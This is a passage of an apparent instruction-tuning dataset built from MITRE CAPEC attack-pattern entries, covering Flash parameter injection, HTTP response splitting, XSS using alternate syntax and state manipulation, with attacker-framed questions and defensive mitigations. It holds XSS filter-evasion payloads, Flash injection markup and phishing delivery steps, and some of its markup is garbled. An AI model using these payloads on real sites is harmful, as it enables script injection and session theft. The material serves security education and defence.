              "The result will be not merely a one-time execution of the JavaScript code in the victim's browser in the context of the domain with the vulnerable Flash file, but every time the Flash is loaded, whether by direct reference or embedded inside the same domain, the JavaScript will be executed again."
            ],
            "xhtml:b": [
              "DOM-based Flash parameter injection",
              "Passing parameter in an embedded URI",
              "Passing parameter in flashvars",
              "Persistent Flash Parameter Injection"
            ],
            "xhtml:div": [
              {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "xhtml:div": {
                  "@style": "margin-left:1em;",
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "#text": "<embed src=\"myFlash.swf\" flashvars=\"location=http://example.com/index.htm#&globalVar=e-v-i-l\"></embed>"
                  },
                  "#text": "<object></object>"
                }
              },
              {
                "@style": "margin-left:1em;",
                "#text": "<object type=\"application/x-shockwave-flash\" data=\"myfile.swf?globalVar=e-v-i-l\" ></object>"
              },
              {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "#text": "<object type=\"application/x-shockwafile.swf\" ve-flash\" data=\"my flashvars=\"language=English&globalVar=e-v-i-l\"></object>"
              },
              {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "xhtml:div": [
                  {
                    "xhtml:i": "// Create a new shared object or read an existing one"
                  },
                  {
                    "@style": "margin-left:1em;",
                    "xhtml:div": [
                      {
                        "xhtml:i": "// Check whether there is a shared object saved"
                      },
                      {
                        "@style": "margin-left:1em;",
                        "xhtml:div": {
                          "xhtml:i": "// Set a default"
                        },
                        "#text": "value _root.flashfile = \"defaultFlash.swf\";"
                      },
                      {
                        "@style": "margin-left:1em;",
                        "xhtml:div": {
                          "xhtml:i": "// Read the flash file to load from the shared object"
                        },
                        "#text": "_root.flashfile = mySharedObject.data.flash;"
                      }
                    ],
                    "xhtml:br": [
                      null,
                      null
                    ],
                    "#text": "if (mySharedObject.data.flash == null) {\n                     } else {\n                     }"
                  },
                  {
                    "xhtml:i": "// Store the flash file's name in the shared object"
                  },
                  {
                    "xhtml:i": "// Load the flash file"
                  }
                ],
                "xhtml:br": [
                  null,
                  null,
                  null,
                  null
                ],
                "#text": "mySharedObject = SharedObject.getLocal(\"flashToLoad\");if (_root.flashfile == undefined) {\n                  }\n                  mySharedObject.data.flash = _root.flashfile;\n                  getURL(_root.flashfile);"
              }
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "88"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-40"
            },
            {
              "@External_Reference_ID": "REF-560"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Phases, Description Summary, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, References, Related_Attack_Patterns, Related_Weaknesses, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Extended_Description, Resources_Required, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: HTTP Response Splitting (CAPEC ID: 34)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern HTTP Response Splitting (CAPEC ID: 34):\nTools capable of monitoring HTTP messages, and crafting malicious HTTP messages and/or injecting malicious content into HTTP messages.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Tools capable of monitoring HTTP messages, and crafting malicious HTTP messages and/or injecting malicious content into HTTP messages.",
      "@Name": "HTTP Response Splitting (CAPEC ID: 34)",
      "attack_ptrn": {
        "@ID": "34",
        "@Name": "HTTP Response Splitting",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": [
            "An adversary manipulates and injects malicious content, in the form of secret unauthorized HTTP responses, into a single HTTP response from a vulnerable or compromised back-end HTTP agent (e.g., web server) or into an already spoofed HTTP response from an adversary controlled domain/site.",
            "See CanPrecede relationships for possible consequences."
          ]
        },
        "Extended_Description": {
          "xhtml:p": [
            "Malicious user input is injected into various standard and/or user defined HTTP headers within a HTTP Response through use of Carriage Return (CR), Line Feed (LF), Horizontal Tab (HT), Space (SP) characters as well as other valid/RFC compliant special characters, and unique character encoding.",
            "A single HTTP response ends up being split as two or more HTTP responses by the targeted client HTTP agent parsing the original maliciously manipulated HTTP response. This allows malicious HTTP responses to bypass security controls in order to implement malicious actions and provide malicious content that allows access to sensitive data and to compromise applications and users. This is performed by the abuse of interpretation and parsing discrepancies in different intermediary HTTP agents (load balancer, reverse proxy, web caching proxies, application firewalls, etc.) or client HTTP agents (e.g., web browser) in the path of the malicious HTTP responses.",
            "This attack is usually the result of the usage of outdated or incompatible HTTP protocol versions as well as lack of syntax checking and filtering of user input in the HTTP agents receiving HTTP messages in the path.",
            {
              "xhtml:i": "client agent (e.g., web browser)",
              "#text": "This differs from CAPEC-105 HTTP Request Splitting, which is usually an attempt to compromise a back-end HTTP agent via HTTP Request messages. HTTP Response Splitting is an attempt to compromise aby sending malicious content in HTTP responses from back-end HTTP infrastructure."
            },
            "HTTP Smuggling (CAPEC-33 and CAPEC-273) is different from HTTP Splitting due to the fact it relies upon discrepancies in the interpretation of various HTTP Headers and message sizes and not solely user input of special characters and character encoding. HTTP Smuggling was established to circumvent mitigations against HTTP Request Splitting techniques."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "220"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "105"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "115"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "141"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "63"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "593"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "148"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "154"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets",
              "Technique": "Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer."
            },
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, HTTP headers, syntax checking and input filtering."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP request to back-end HTTP infrastructure to inject adversary data (in the form of HTTP headers with custom strings and embedded web scripts and objects) into HTTP responses (intended for intermediary and/or front-end client/victim HTTP agents communicating with back-end HTTP infrastructure) for the purpose of interfering with the parsing of HTTP responses by intermediary and front-end client/victim HTTP agents. The intended consequences of the malicious HTTP request and the subsequent adversary injection and manipulation of HTTP responses to intermediary and front-end client/victim HTTP agents, will be observed to confirm applicability of identified vulnerabilities in the adversary's plan of attack.",
              "Technique": [
                "Continue the monitoring of HTTP traffic.",
                {
                  "xhtml:p": [
                    "Utilize different sequences of special characters (CR - Carriage Return, LF - Line Feed, HT - Horizontal Tab, SP - Space and etc.) to bypass filtering and back-end encoding and to embed:",
                    "to utilize additional special characters (e.g., > and <) filtered by the target HTTP agent.",
                    "Note that certain special characters and character encoding may be applicable only to intermediary and front-end agents with rare configurations or that are not RFC compliant."
                  ],
                  "xhtml:ul": {
                    "xhtml:li": [
                      "additional HTTP Requests with their own headers",
                      "malicious web scripts into parameters of HTTP Request headers (e.g., browser cookies like Set-Cookie or Ajax web/browser object parameters like XMLHttpRequest)",
                      "adversary chosen encoding (e.g., UTF-7)"
                    ]
                  }
                },
                "Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request."
              ]
            },
            {
              "Step": "1",
              "Phase": "Exploit",
              "Description": "[Perform HTTP Response Splitting attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.",
              "Technique": "Leverage techniques identified in the Experiment Phase."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "A vulnerable or compromised server or domain/site capable of allowing adversary to insert/inject malicious content that will appear in the server's response to target HTTP agents (e.g., proxies and users' web browsers).",
            "Differences in the way the two HTTP agents parse and interpret HTTP requests and its headers.",
            "HTTP headers capable of being user-manipulated.",
            "HTTP agents running on HTTP/1.0 or HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers."
            },
            {
              "@Level": "Medium",
              "#text": "Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers."
            },
            {
              "@Level": "Medium",
              "#text": "Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Tools capable of monitoring HTTP messages, and crafting malicious HTTP messages and/or injecting malicious content into HTTP messages."
        },
        "Indicators": {
          "Indicator": "Differences in responses processed by the two agents with multiple responses to a single request in the web logs. This requires careful monitoring or a capable log analysis tool."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: evaluate HTTP agents prior to deployment for parsing/interpretation discrepancies.",
            "Configuration: front-end HTTP agents notice ambiguous requests.",
            "Configuration: back-end HTTP agents reject ambiguous requests and close the network connection.",
            "Configuration: Disable reuse of back-end connections.",
            "Configuration: Use HTTP/2 for back-end connections.",
            "Configuration: Use the same web server software for front-end and back-end server.",
            "Implementation: Utilize a Web Application Firewall (WAF) that has built-in mitigation to detect abnormal requests/responses.",
            "Configuration: Install latest vendor security patches available for both intermediary and back-end HTTP infrastructure (i.e. proxies and web servers)",
            "Configuration: Ensure that HTTP infrastructure in the chain or network path utilize a strict uniform parsing process.",
            "Implementation: Utilize intermediary HTTP infrastructure capable of filtering and/or sanitizing user-input."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "In the PHP 5 session extension mechanism, a user-supplied session ID is sent back to the user within the Set-Cookie HTTP header. Since the contents of the user-supplied session ID are not validated, it is possible to inject arbitrary HTTP headers into the response body. This immediately enables HTTP Response Splitting by simply terminating the HTTP response header from within the session ID used in the Set-Cookie directive. See also: CVE-2006-0207"
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "113"
            },
            {
              "@CWE_ID": "138"
            },
            {
              "@CWE_ID": "436"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "WASC",
            "Entry_ID": "25",
            "Entry_Name": "HTTP Response Splitting"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-117"
            },
            {
              "@External_Reference_ID": "REF-617"
            },
            {
              "@External_Reference_ID": "REF-680"
            }
          ]
        },
        "Notes": {
          "Note": [
            {
              "@Type": "Terminology",
              "#text": "HTTP Splitting \u2013 \"the act of forcing a sender of (HTTP) messages to emit data stream consisting of more messages than the sender\u2019s intension. The messages sent are 100% valid and RFC compliant\" [REF-117]."
            },
            {
              "@Type": "Terminology",
              "#text": "HTTP Smuggling \u2013 \"the act of forcing a sender of (HTTP) messages to emit data stream which may be parsed as a different set of messages (i.e. dislocated message boundaries) than the sender\u2019s intention. This is done by virtue of forcing the sender to emit non-standard messages which can be interpreted in more than one way\" [REF-117]."
            },
            {
              "@Type": "Relationship",
              "#text": "HTTP Smuggling is an evolution of previous HTTP Splitting techniques which are commonly remediated against."
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Payload_Activation_Impact, Probing_Techniques, Related_Attack_Patterns, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated @Status, Consequences, Description, Example_Instances, Execution_Flow, Extended_Description, Indicators, Mitigations, Notes, Prerequisites, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Skills_Required, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: XSS Using Alternate Syntax (CAPEC ID: 199)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern XSS Using Alternate Syntax (CAPEC ID: 199):\nAbility to send HTTP request to a web application.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to send HTTP request to a web application.",
      "@Name": "XSS Using Alternate Syntax (CAPEC ID: 199)",
      "attack_ptrn": {
        "@ID": "199",
        "@Name": "XSS Using Alternate Syntax",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary uses alternate forms of keywords or commands that result in the same action as the primary form but which may not be caught by filters. For example, many keywords are processed in a case insensitive manner. If the site's web filtering algorithm does not convert all tags into a consistent case before the comparison with forbidden keywords it is possible to bypass filters (e.g., incomplete black lists) by using an alternate case structure. For example, the \"script\" tag using the alternate forms of \"Script\" or \"ScRiPt\" may bypass filters where \"script\" is the only form tested. Other variants using different syntax representations are also possible as well as using pollution meta-characters or entities that are eventually ignored by the rendering engine. The attack can result in the execution of otherwise prohibited functionality.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "591"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "592"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "588"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.",
              "Technique": [
                "Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe identified potential entry points for XSS vulnerability] Possibly using an automated tool, an adversary requests variations on the inputs they surveyed before using alternate syntax. These inputs are designed to bypass incomplete filtering (e.g., incomplete HTML encoding etc.) and try many variations of characters injection that would enable the XSS payload. They record all the responses from the server that include unmodified versions of their script.",
              "Technique": [
                "Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier. Attempt numerous variations based on form, format, syntax & encoding.",
                "Use a proxy tool to record results of manual input of XSS probes in known URLs."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Craft malicious XSS URL] Once the adversary has determined which parameters are vulnerable to XSS, they will craft a malicious URL containing the XSS exploit. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from the victim.",
              "Technique": [
                "Change a URL parameter to include a malicious script tag created using alternate syntax to bypass filters.",
                "Send information gathered from the malicious script to a remote endpoint."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Get victim to click URL] In order for the attack to be successful, the victim needs to access the malicious URL.",
              "Technique": [
                "Send a phishing email to the victim containing the malicious URL. This can be hidden in a hyperlink as to not show the full URL, which might draw suspicion.",
                "Put the malicious URL on a public forum, where many victims might accidentally click the link."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Target client software must allow scripting such as JavaScript."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To inject the malicious payload in a web page"
            },
            {
              "@Level": "High",
              "#text": "To bypass non trivial filters in the application"
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Ability to send HTTP request to a web application."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use browser technologies that do not allow client side scripting.",
            "Design: Utilize strict type, character, and encoding enforcement",
            "Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.",
            "Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.",
            "Implementation: Perform input validation for all remote content, including remote and user-generated content",
            "Implementation: Perform output validation for all remote content.",
            "Implementation: Disable scripting languages such as JavaScript in browser",
            "Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "In this example, the adversary tries to get <script>alert(1)</script> executed by the victim's browser. The target application employs regular expressions to make sure no script is being passed through the application to the web page; such a regular expression could be ((?i)script), and the application would replace all matches by this regex by the empty string. An adversary will then create a special payload to bypass this filter:",
              "when the applications gets this input string, it will replace all \"script\" (case insensitive) by the empty string and the resulting input will be the desired vector by the adversary:",
              "In this example, we assume that the application needs to write a particular string in a client-side JavaScript context (e.g., <script>HERE</script>). For the adversary to execute the same payload as in the previous example, they would need to send alert(1) if there was no filtering. The application makes use of the following regular expression as filter",
              "and replaces all matches by the empty string. For example each occurrence of alert(), eval(), foo() or even the string \"alert\" would be stripped. An adversary will then create a special payload to bypass this filter:",
              "when the applications gets this input string, it won't replace anything and this piece of JavaScript has exactly the same runtime meaning as alert(1). The adversary could also have used non-alphanumeric XSS vectors to bypass the filter; for example,",
              "would be executed by the JavaScript engine like alert(1) is."
            ],
            "xhtml:div": [
              {
                "@style": "margin-left:1em;",
                "@class": "attack",
                "#text": "<scriscriptpt>alert(1)</scscriptript>"
              },
              {
                "@style": "margin-left:1em;",
                "@class": "result",
                "#text": "<script>alert(1)</script>"
              },
              {
                "@style": "margin-left:1em;",
                "@class": "mitigation",
                "#text": "((\\w+)\\s*\\(.*\\)|alert|eval|function|document)"
              },
              {
                "@style": "margin-left:1em;",
                "@class": "attack",
                "#text": "this['al' + 'ert'](1)"
              },
              {
                "@style": "margin-left:1em;",
                "@class": "attack",
                "#text": "($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_)"
              }
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "87"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-69",
              "@Section": "XSS Filter Evasion Cheat Sheet"
            },
            {
              "@External_Reference_ID": "REF-70",
              "@Section": "Testing for Cross site scripting"
            },
            {
              "@External_Reference_ID": "REF-71"
            },
            {
              "@External_Reference_ID": "REF-72",
              "@Section": "WASC-08 - Cross Site Scripting"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Consequences"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-05-01",
            "#text": "Cross-Site Scripting Using Alternate Syntax"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Manipulating State (CAPEC ID: 74)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Manipulating State (CAPEC ID: 74):\nThe adversary needs a data tampering tool capable of generating and creating custom inputs to aid in the attack, like Fiddler, Wireshark, or a similar in-browser plugin (e.g., Tamper Data for Firefox).",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary needs a data tampering tool capable of generating and creating custom inputs to aid in the attack, like Fiddler, Wireshark, or a similar in-browser plugin (e.g., Tamper Data for Firefox).",
      "@Name": "Manipulating State (CAPEC ID: 74)",
      "attack_ptrn": {
        "@ID": "74",
        "@Name": "Manipulating State",
        "@Abstraction": "Meta",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": [
            "The adversary modifies state information maintained by the target software or causes a state transition in hardware. If successful, the target will use this tainted state and execute in an unintended manner.",
            "State management is an important function within a software application. User state maintained by the application can include usernames, payment information, browsing history as well as application-specific contents such as items in a shopping cart. Manipulating user state can be employed by an adversary to elevate privilege, conduct fraudulent transactions or otherwise modify the flow of the application to derive certain benefits.",
            "If there is a hardware logic error in a finite state machine, the adversary can use this to put the system in an undefined state which could cause a denial of service or exposure of secure data."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "Adversary determines the nature of state management employed by the target. This includes determining the location (client-side, server-side or both applications) and possibly the items stored as part of user state."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "The adversary now tries to modify the user state contents (possibly indiscriminately if the contents are encrypted or otherwise obfuscated) or cause a state transition and observe the effects of this change on the target."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "Having determined how to manipulate the state, the adversary can perform illegitimate actions."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "User state is maintained at least in some way in user-controllable locations, such as cookies or URL parameters.",
            "There is a faulty finite state machine in the hardware logic that can be exploited."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The adversary needs to have knowledge of state management as employed by the target application, and also the ability to manipulate the state in a meaningful way."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary needs a data tampering tool capable of generating and creating custom inputs to aid in the attack, like Fiddler, Wireshark, or a similar in-browser plugin (e.g., Tamper Data for Firefox)."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Do not rely solely on user-controllable locations, such as cookies or URL parameters, to maintain user state.",
            "Avoid sensitive information, such as usernames or authentication and authorization information, in user-controllable locations.",
            "Sensitive information that is part of the user state must be appropriately protected to ensure confidentiality and integrity at each request.",
            "All possible states must be handled by hardware finite state machines."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "During the authentication process, an application stores the authentication decision (auth=0/1) in unencrypted cookies. At every request, this cookie is checked to permit or deny a request.",
              "An adversary can easily violate this representation of user state and set auth=1 at every request in order to gain illegitimate access and elevated privilege in the application."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "372"
            },
            {
              "@CWE_ID": "315"
            },
            {
              "@CWE_ID": "353"
            },
            {
              "@CWE_ID": "693"
            },
            {
              "@CWE_ID": "1245"
            },
            {
              "@CWE_ID": "1253"
            },
            {
              "@CWE_ID": "1265"
            },
            {
              "@CWE_ID": "1271"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Description Summary, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Probing_Techniques, Resources_Required, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated @Name, Consequences, Description, Execution_Flow, Mitigations, Prerequisites, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Execution_Flow, Related_Weaknesses"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2020-07-30",
            "#text": "Manipulating User State"
          }
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Calling Micro-Services Directly (CAPEC ID: 179)",
    "context": "",
    "output": "The resources required to execute Calling Micro-Services Directly (CAPEC ID: 179) are the following: The attacker usually needs to be able to invoke micro-services directly in order to control the parameters that are used in their attack. The attacker may require other resources depending on the nature of the flaw in the targeted micro-service.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker usually needs to be able to invoke micro-services directly in order to control the parameters that are used in their attack. The attacker may require other resources depending on the nature of the flaw in the targeted micro-service.",
      "@Name": "Calling Micro-Services Directly (CAPEC ID: 179)",
      "attack_ptrn": {
        "@ID": "179",
        "@Name": "Calling Micro-Services Directly",
        "@Abstraction": "Standard",
        "@Status": "Draft",
